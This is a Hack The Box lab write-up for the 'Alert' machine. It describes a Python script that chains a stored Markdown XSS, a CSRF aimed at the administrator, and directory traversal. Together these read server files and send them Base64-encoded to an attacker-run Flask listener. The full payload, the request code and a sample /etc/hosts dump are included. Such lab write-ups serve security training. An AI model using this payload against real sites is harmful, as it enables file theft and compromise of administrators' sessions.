# Hack The Box. Machines. Alert

Machine write-up: https://7rocky.github.io/en/htb/alert

### `lfr.py`

This Python script is used to read files from the server exploiting a Local File Read vulnerability that is only accessible by the administrator. We need to use Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) to execute JavaScript on the administrator's browser and read the response to the protected endpoint.

This piece of code creates the Markdown XSS payload to exploit the Local File Read vulnerability (using Directory Traversal) through a CSRF and sends back the response to a controlled server in Base64:

```python
markdown = f'''<img onerror="fetch('{URL}/messages.php?file=../../../..{filename}').then(r => r.text()).then(r => fetch('http://{IP}:{PORT}/?c=' + btoa(r)))" src="x">'''

r = requests.post(f'{URL}/visualizer.php', files={'file': ('test.md', markdown, 'text/x-markdown')})
link = re.findall(r'<a class="share-button" href="(.*?)" target="_blank">Share Markdown</a>', r.text)[0]

requests.post(f'{URL}/contact.php', data={'email': 'asdf@asdf.com', 'message': link})
```

The Python script also contains a Flask server to receive the Base64-encoded response and print its contents. We take out `<pre>` and `</pre>` tags to enhance readability:

```python
app = Flask(__name__)


@app.route('/')
def index():
    print(b64d(request.query_string[2:]).decode('latin1')[5:-8])
    os._exit(0)


Thread(target=app.run, kwargs={'port': PORT, 'host': IP}).start()
```

We add some options to remove Flask's debugging messages on startup:

```python
logging.getLogger('werkzeug').disabled = True
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *_: None
```

And these are the required parameters to use the script:

```python
URL = 'http://alert.htb'
IP = sys.argv[1]
PORT = 5000
filename = sys.argv[2]
```

With this, we can read files as follows:

```console
$ python3 lfr.py 10.10.16.6 /etc/hosts
127.0.0.1 localhost
127.0.1.1 alert
127.0.0.1 alert.htb
127.0.0.1 statistics.alert.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
